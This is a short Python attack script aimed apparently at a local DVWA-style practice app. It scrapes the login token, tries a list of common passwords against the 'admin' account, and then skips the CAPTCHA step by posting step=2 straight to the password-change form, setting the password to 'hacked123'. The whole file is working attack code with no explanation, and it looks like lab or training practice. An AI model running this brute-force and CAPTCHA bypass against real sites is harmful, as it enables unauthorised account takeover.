import requests
import re

# Use requests session to maintain cookies
s = requests.Session()

# Get login page
r = s.get('http://127.0.0.1:8080/login.php')
print("GET login.php status:", r.status_code)

# Extract user_token
match = re.search(r'name=["\']user_token["\'][^>]*value=["\']([^"\']+)', r.text)
if match:
    user_token = match.group(1)
    print("user_token:", user_token)
else:
    print("Could not find user_token")
    # Print form section
    form_match = re.search(r'<form.*?</form>', r.text, re.DOTALL)
    if form_match:
        print("Form:", form_match.group(0)[:500])
    else:
        print("No form found in page")
        print(r.text[:1000])

# Try login with various passwords
passwords = ['password', 'admin', 'admin123', 'letmein', '123456', 'Password', 'admin1']
for pwd in passwords:
    login_data = {
        'username': 'admin',
        'password': pwd,
        'Login': 'Login',
        'user_token': user_token
    }
    
    # Need to get fresh token for each attempt
    r = s.post('http://127.0.0.1:8080/login.php', data=login_data, allow_redirects=False)
    
    # Check if login succeeded by checking for redirect to index.php
    if r.status_code == 302:
        location = r.headers.get('Location', '')
        print(f"Password '{pwd}': redirect to {location}")
        if 'index.php' in location:
            print("  -> LOGIN SUCCESS with password:", pwd)
            # Now access captcha page
            s.get('http://127.0.0.1:8080/login.php')  # Follow redirect
            r = s.get('http://127.0.0.1:8080/vulnerabilities/captcha/')
            print("  Captcha page status:", r.status_code)
            print("  Captcha page URL:", r.url)
            
            # Try bypass
            r = s.post('http://127.0.0.1:8080/vulnerabilities/captcha/', data={
                'step': '2',
                'password_new': 'hacked123',
                'password_conf': 'hacked123',
                'Change': 'Change'
            })
            print("  Bypass status:", r.status_code)
            if 'Password Changed' in r.text:
                print("  *** BYPASS SUCCESSFUL! ***")
                print("  Context:", r.text[r.text.index('Password Changed')-50:r.text.index('Password Changed')+200])
            else:
                print("  No Password Changed in response")
                # Check for any pre tags
                pres = re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                print("  Pre tags:", pres)
            break
    elif r.status_code == 200:
        if 'Login' in r.text and 'failed' in r.text.lower():
            print(f"Password '{pwd}': login failed")
        else:
            print(f"Password '{pwd}': unknown result (200)")
    else:
        print(f"Password '{pwd}': status {r.status_code}")
